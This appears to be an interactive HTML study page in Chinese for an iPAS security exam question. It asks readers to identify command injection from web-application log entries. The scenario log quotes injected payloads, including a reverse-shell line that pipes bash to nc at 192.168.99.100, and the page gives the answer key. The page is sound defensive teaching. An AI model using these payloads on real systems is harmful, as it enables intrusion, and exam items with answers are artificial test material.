<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPAS 資安題組解析：指令注入攻擊判斷</title>
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #34495e;
            --accent-color: #3498db;
            --success-color: #27ae60;
            --error-color: #c0392b;
            --bg-color: #f4f6f7;
            --text-color: #333;
            --code-bg: #eaecee;
            --border-radius: 8px;
        }

        body {
            font-family: "Microsoft JhengHei", "Heiti TC", sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            line-height: 1.6;
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: var(--border-radius);
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        h1, h2, h3 {
            color: var(--primary-color);
        }

        h1 {
            text-align: center;
            border-bottom: 2px solid var(--accent-color);
            padding-bottom: 15px;
            margin-bottom: 25px;
            font-size: 1.8rem;
        }

        .meta-info {
            background-color: var(--primary-color);
            color: white;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 4px;
            font-size: 0.9rem;
            margin-bottom: 20px;
        }

        /* Scenario Box */
        .scenario-box {
            background-color: #e8f6f3;
            border-left: 5px solid var(--secondary-color);
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }

        .log-display {
            background-color: #2c3e50;
            color: #ecf0f1;
            padding: 15px;
            font-family: Consolas, monospace;
            border-radius: 4px;
            margin: 10px 0;
            overflow-x: auto;
        }

        img.scenario-img {
            max-width: 100%;
            height: auto;
            display: block;
            margin: 15px auto;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        /* Quiz Section */
        .quiz-section {
            margin: 30px 0;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: var(--border-radius);
        }

        .options-grid {
            display: grid;
            gap: 10px;
            margin-top: 15px;
        }

        .option-btn {
            padding: 12px 15px;
            background-color: white;
            border: 2px solid #bdc3c7;
            border-radius: 6px;
            cursor: pointer;
            text-align: left;
            font-size: 1rem;
            transition: all 0.2s;
            color: var(--text-color);
        }

        .option-btn:hover:not(:disabled) {
            background-color: #f0f3f4;
            border-color: var(--accent-color);
        }

        .option-btn.correct {
            background-color: #d4efdf;
            border-color: var(--success-color);
            color: var(--success-color);
            font-weight: bold;
        }

        .option-btn.wrong {
            background-color: #fadbd8;
            border-color: var(--error-color);
            color: var(--error-color);
        }

        .feedback-area {
            margin-top: 15px;
            padding: 15px;
            border-radius: 6px;
            display: none;
        }

        .feedback-area.show {
            display: block;
        }

        .feedback-correct {
            background-color: #d4efdf;
            color: #145a32;
            border: 1px solid #a9dfbf;
        }

        .feedback-wrong {
            background-color: #fadbd8;
            color: #7b241c;
            border: 1px solid #f5b7b1;
        }

        .controls {
            margin-top: 20px;
            display: flex;
            gap: 10px;
        }

        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.95rem;
            transition: background 0.3s;
        }

        .btn-reset {
            background-color: #95a5a6;
            color: white;
        }
        .btn-reset:hover { background-color: #7f8c8d; }

        .btn-reveal {
            background-color: var(--accent-color);
            color: white;
        }
        .btn-reveal:hover { background-color: #2980b9; }

        /* Accordion Styles */
        .accordion {
            margin-top: 30px;
        }

        .accordion-item {
            border: 1px solid #e0e0e0;
            margin-bottom: 10px;
            border-radius: 6px;
            overflow: hidden;
        }

        .accordion-header {
            background-color: #f8f9f9;
            padding: 15px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-weight: bold;
            color: var(--secondary-color);
            user-select: none;
        }

        .accordion-header:hover {
            background-color: #eaecee;
        }

        .accordion-header::after {
            content: '+';
            font-size: 1.2rem;
            color: var(--accent-color);
        }

        .accordion-header.active::after {
            content: '-';
        }

        .accordion-content {
            display: none;
            padding: 20px;
            background-color: white;
            border-top: 1px solid #e0e0e0;
        }

        .accordion-content.active {
            display: block;
        }

        .highlight {
            background-color: #fff3cd;
            padding: 2px 4px;
            border-radius: 3px;
            font-weight: bold;
        }

        .keyword-list li {
            margin-bottom: 10px;
        }

        /* Progress Bar */
        .progress-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 5px;
            background-color: #eee;
            z-index: 1000;
        }

        .progress-bar {
            height: 100%;
            background-color: var(--success-color);
            width: 0%;
            transition: width 0.5s ease;
        }

        /* Self Check Section */
        .self-check-item {
            margin-bottom: 15px;
            padding: 10px;
            background: #fafafa;
            border-left: 3px solid var(--accent-color);
        }

        .answer-reveal {
            display: none;
            margin-top: 10px;
            color: var(--success-color);
            font-weight: bold;
        }

        /* Responsive */
        @media (max-width: 600px) {
            .container { padding: 15px; }
            h1 { font-size: 1.4rem; }
        }
    </style>
</head>
<body>

<!-- Progress Bar -->
<div class="progress-container">
    <div class="progress-bar" id="progressBar"></div>
</div>

<div class="container">
    <div class="meta-info">iPAS 題組：第 33 - 36 題</div>
    
    <h1>題組：第 33 題 - 指令注入攻擊判斷</h1>

    <!-- 情境區塊 -->
    <div class="scenario-box">
        <h3>【題組情境】</h3>
        <p>你是一位企業的藍隊防禦專家（負責企業內部資安防禦的人員），收到 SOC（資訊安全維運中心）告警，顯示某伺服器出現異常行為。</p>
        <p>你開始調查該伺服器，發現有一個 ping 功能（測試網路連線的工具），且在該功能的網頁應用程式日誌中出現下列內容：</p>
        
        <div class="log-display">
127.0.0.1; sleep 5<br>
127.0.0.1; whoami<br>
127.0.0.1; /bin/bash -i 2>&1 | nc 192.168.99.100 80 > /tmp/tmp.txt
        </div>

        <img src="https://i.meee.com.tw/zmoyb9O.jpg" alt="日誌截圖" class="scenario-img">
    </div>

    <!-- 題目區塊 -->
    <div class="quiz-section">
        <h3>【題目 33】單選題</h3>
        <p>請問這些日誌內容裡面的「127.0.0.1; sleep 5」，最有可能是發生下列哪一種攻擊情境？</p>

        <div class="options-grid" id="optionsContainer">
            <button class="option-btn" onclick="checkAnswer('A', this)">(A) 攻擊者想確認該功能是否存在資料庫注入攻擊（SQL Injection）</button>
            <button class="option-btn" onclick="checkAnswer('B', this)">(B) 攻擊者想確認該功能是否存在反序列化攻擊（Insecure Deserialization）</button>
            <button class="option-btn" onclick="checkAnswer('C', this)">(C) 攻擊者想確認該功能是否存在指令注入攻擊（Command Injection）</button>
            <button class="option-btn" onclick="checkAnswer('D', this)">(D) 攻擊者想確認該功能是否存在資安記錄及監控失效（Security Logging and Monitoring Failures）</button>
        </div>

        <div id="feedback" class="feedback-area">
            <h4 id="feedbackTitle"></h4>
            <p id="feedbackText"></p>
        </div>

        <div class="controls">
            <button class="btn btn-reveal" onclick="revealAnswer()">顯示正解</button>
            <button class="btn btn-reset" onclick="resetQuiz()">重設作答</button>
        </div>
    </div>

    <hr>

    <!-- 解析區塊 (Accordion) -->
    <h2>完整解析</h2>
    <p style="font-size: 0.9rem; color: #666;">點擊下方標題展開詳細說明</p>

    <div class="accordion">
        
        <!-- 第一步 -->
        <div class="accordion-item">
            <div class="accordion-header" onclick="toggleAccordion(this)">第一步：找關鍵字</div>
            <div class="accordion-content">
                <ul class="keyword-list">
                    <li><span class="highlight">ping 功能</span>：通常網頁程式為了執行 ping，會在後端呼叫作業系統的指令（Command）。</li>
                    <li><span class="highlight">127.0.0.1</span>：這是本機 IP，看起來是合法的輸入參數，用來掩飾後面的惡意指令。</li>
                    <li><span class="highlight">分號「;」</span>：在 Linux/Unix 系統中，分號用來串接多個指令。意思是「做完前面的指令，接著做後面的」。</li>
                    <li><span class="highlight">sleep 5</span>：讓系統暫停 5 秒。這是駭客常用的「盲測」手法，如果網頁真的卡住 5 秒才回應，代表指令被成功執行了。</li>
                    <li><span class="highlight">whoami</span>：詢問系統「我是誰？」的指令，用來查看目前擁有什麼權限。</li>
                    <li><span class="highlight">/bin/bash -i ... nc ...</span>：這是一串建立「反彈 Shell」的指令，代表攻擊者試圖從外部控制這台伺服器。</li>
                </ul>
            </div>
        </div>

        <!-- 第二步 -->
        <div class="accordion-item">
            <div class="accordion-header" onclick="toggleAccordion(this)">第二步：白話翻譯</div>
            <div class="accordion-content">
                <p><strong>高中生也聽得懂的解釋：</strong></p>
                <p>「原本這個網頁功能只是要幫你 ping 一下網路有沒有通，但是攻擊者很壞，他在 IP 後面偷加了『; sleep 5』。</p>
                <p>這就像你在餐廳點餐說：『我要一份炒飯；<strong>順便把老闆叫出來</strong>』。</p>
                <p>如果伺服器（服務生）真的傻傻地停頓了 5 秒（把老闆叫出來），就代表它沒有檢查你的話，把你輸入的文字當成系統指令直接執行了。」</p>
            </div>
        </div>

        <!-- 第三步 -->
        <div class="accordion-item">
            <div class="accordion-header" onclick="toggleAccordion(this)">第三步：解題思路</div>
            <div class="accordion-content">
                <p><strong>這題在考什麼觀念？</strong><br>
                利用分號串接額外系統指令來測試是否能被執行，是典型的「指令注入」測試手法。</p>
                
                <p><strong>解題三步驟：</strong></p>
                <ol>
                    <li><strong>判斷功能</strong>：該功能會呼叫系統指令（例如 ping）。</li>
                    <li><strong>看符號</strong>：輸入中出現了指令分隔符號（;、|、&&）。</li>
                    <li><strong>看指令</strong>：後續出現了與作業系統操作有關的動作（sleep 暫停、whoami 查帳號、bash 執行程式）。</li>
                </ol>
            </div>
        </div>

        <!-- 第四步 -->
        <div class="accordion-item">
            <div class="accordion-header" onclick="toggleAccordion(this)">第四步：選項分析</div>
            <div class="accordion-content">
                <p><strong>(A) 資料庫注入攻擊（SQL Injection）：<span style="color:var(--error-color)">錯誤</span></strong><br>
                SQL Injection 是對資料庫語法動手腳（如出現 <code>' OR 1=1 --</code>）。日誌內容完全沒有 SQL 語法或資料庫行為。</p>

                <p><strong>(B) 反序列化攻擊（Insecure Deserialization）：<span style="color:var(--error-color)">錯誤</span></strong><br>
                通常涉及經過編碼的物件資料（Object），目的是在資料還原過程中執行惡意程式碼，與這裡直接打 shell 指令無關。</p>

                <p><strong>(C) 指令注入攻擊（Command Injection）：<span style="color:var(--success-color)">正確</span></strong><br>
                使用「;」串接指令是典型特徵。攻擊者先用 <code>sleep</code> 測試（試水溫），再用 <code>whoami</code> 確認權限，最後嘗試入侵。</p>

                <p><strong>(D) 資安記錄及監控失效：<span style="color:var(--error-color)">錯誤</span></strong><br>
                這是 OWASP Top 10 的風險分類名稱，指的是「沒紀錄日誌」或「沒發現告警」。但題目問的是日誌裡顯示的「實際攻擊手法」，而不是管理上的疏失。</p>
            </div>
        </div>

        <!-- 觀念補充 -->
        <div class="accordion-item">
            <div class="accordion-header" onclick="toggleAccordion(this)">觀念補充與延伸</div>
            <div class="accordion-content">
                <p><strong>核心觀念定位：</strong><br>
                本題屬於「Web 攻擊手法 / 指令注入 / 日誌分析」，是資安事件判斷的高頻題型。</p>
                
                <p><strong>觸類旁通：</strong></p>
                <ul>
                    <li><strong>SQL Injection：</strong> 對「資料庫」下指令。</li>
                    <li><strong>Command Injection：</strong> 對「作業系統（OS）」下指令。</li>
                </ul>

                <p><strong>記憶口訣：</strong></p>
                <div style="background:#f9e79f; padding:10px; border-radius:5px; margin:10px 0;">
                    <strong>「看到分號加指令，就是 Command Injection」</strong><br>
                    <strong>「sleep 先試水，whoami 再看權限」</strong>
                </div>
            </div>
        </div>

        <!-- 常見陷阱 -->
        <div class="accordion-item">
            <div class="accordion-header" onclick="toggleAccordion(this)">常見陷阱與避坑</div>
            <div class="accordion-content">
                <ul>
                    <li><strong>容易搞混：</strong> 看到「注入」兩個字就選 SQL Injection。請記得看它是注入「SQL語法」還是「系統指令」。</li>
                    <li><strong>心理盲點：</strong> 看到 IP 是 <code>127.0.0.1</code> 就以為沒問題，忽略了後面的分號。</li>
                    <li><strong>避坑指南：</strong> 只要看到 <code>;</code> (分號)、<code>|</code> (管線)、<code>&&</code> (且) 出現在輸入欄位，先聯想到指令注入。</li>
                </ul>
            </div>
        </div>
    </div>

    <!-- 正解摘要 -->
    <div style="margin-top: 30px; padding: 20px; background-color: #eaf2f8; border-radius: 8px;">
        <h3>【正確答案】</h3>
        <p style="font-size: 1.2rem; font-weight: bold; color: var(--primary-color);">答案：(C)</p>
        <p>理由：因為攻擊者利用分號（;）串接 sleep 指令來測試是否能直接對作業系統執行指令，這是典型的指令注入（Command Injection）行為。</p>
    </div>

    <!-- 自我檢測 -->
    <div class="quiz-section" style="border-color: var(--accent-color);">
        <h3>【自我檢測】</h3>
        <p>確認你是否真的學會了：</p>
        
        <div class="self-check-item">
            <p><strong>Q1. 如果日誌出現「127.0.0.1 && id」，代表什麼風險？</strong></p>
            <button class="btn btn-reveal" style="font-size: 0.8rem;" onclick="showSelfCheckAnswer(this, '這也是指令注入。&& 代表如果前面指令成功，就執行後面的 id 指令（用來顯示使用者 ID）。')">看答案</button>
            <div class="answer-reveal"></div>
        </div>

        <div class="self-check-item">
            <p><strong>Q2. 為什麼攻擊者常先用 sleep 測試，而不是直接反彈 shell？</strong></p>
            <button class="btn btn-reveal" style="font-size: 0.8rem;" onclick="showSelfCheckAnswer(this, '因為如果不確定漏洞是否存在，直接攻擊容易失敗或被防禦設備攔截。Sleep 是一種低調的確認方式（Blind Injection）。')">看答案</button>
            <div class="answer-reveal"></div>
        </div>

        <div class="self-check-item">
            <p><strong>Q3. 開發人員可以用哪兩種方式防止指令注入？</strong></p>
            <button class="btn btn-reveal" style="font-size: 0.8rem;" onclick="showSelfCheckAnswer(this, '1. 避免直接呼叫系統指令（改用語言內建函式庫）。<br>2. 嚴格過濾輸入（白名單驗證），禁止輸入特殊符號如 ; | & 等。')">看答案</button>
            <div class="answer-reveal"></div>
        </div>
    </div>

</div>

<script>
    // 狀態追蹤
    let progress = {
        quizDone: false,
        accordionOpened: false,
        selfCheckDone: false
    };

    function updateProgress() {
        let completed = 0;
        if (progress.quizDone) completed++;
        if (progress.accordionOpened) completed++;
        if (progress.selfCheckDone) completed++;
        
        const percentage = (completed / 3) * 100;
        document.getElementById('progressBar').style.width = percentage + '%';
    }

    function checkAnswer(selectedOption, btnElement) {
        const correctOption = 'C';
        const feedbackArea = document.getElementById('feedback');
        const feedbackTitle = document.getElementById('feedbackTitle');
        const feedbackText = document.getElementById('feedbackText');
        
        // 禁用所有按鈕
        const buttons = document.querySelectorAll('.option-btn');
        buttons.forEach(btn => btn.disabled = true);

        // 顯示回饋區塊
        feedbackArea.className = 'feedback-area show';

        if (selectedOption === correctOption) {
            btnElement.classList.add('correct');
            feedbackArea.classList.add('feedback-correct');
            feedbackArea.classList.remove('feedback-wrong');
            feedbackTitle.innerText = '答對了！';
            feedbackText.innerText = '觀念正確！看到「; sleep 5」接在參數後面，就是為了測試作業系統是否會執行額外指令。';
        } else {
            btnElement.classList.add('wrong');
            // 標示正確答案
            buttons.forEach(btn => {
                if(btn.innerText.startsWith('(C)')) btn.classList.add('correct');
            });
            
            feedbackArea.classList.add('feedback-wrong');
            feedbackArea.classList.remove('feedback-correct');
            feedbackTitle.innerText = '答錯了';
            feedbackText.innerText = '提示：請注意「sleep」是作業系統的指令，且「;」是用來串接指令的符號。這不是資料庫的問題喔。';
        }

        progress.quizDone = true;
        updateProgress();
    }

    function revealAnswer() {
        const buttons = document.querySelectorAll('.option-btn');
        buttons.forEach(btn => {
            btn.disabled = true;
            if(btn.innerText.startsWith('(C)')) {
                btn.classList.add('correct');
            }
        });
        
        const feedbackArea = document.getElementById('feedback');
        feedbackArea.className = 'feedback-area show feedback-correct';
        document.getElementById('feedbackTitle').innerText = '正解顯示';
        document.getElementById('feedbackText').innerText = '正確答案是 (C)。請參考下方的詳細解析。';
        
        progress.quizDone = true;
        updateProgress();
    }

    function resetQuiz() {
        const buttons = document.querySelectorAll('.option-btn');
        buttons.forEach(btn => {
            btn.disabled = false;
            btn.classList.remove('correct', 'wrong');
        });

        const feedbackArea = document.getElementById('feedback');
        feedbackArea.className = 'feedback-area'; // 隱藏
    }

    function toggleAccordion(header) {
        const content = header.nextElementSibling;
        
        header.classList.toggle('active');
        content.classList.toggle('active');

        if (!progress.accordionOpened) {
            progress.accordionOpened = true;
            updateProgress();
        }
    }

    function showSelfCheckAnswer(btn, answerHtml) {
        const answerDiv = btn.nextElementSibling;
        answerDiv.innerHTML = answerHtml;
        answerDiv.style.display = 'block';
        btn.style.display = 'none';

        if (!progress.selfCheckDone) {
            progress.selfCheckDone = true;
            updateProgress();
        }
    }
</script>

</body>
</html>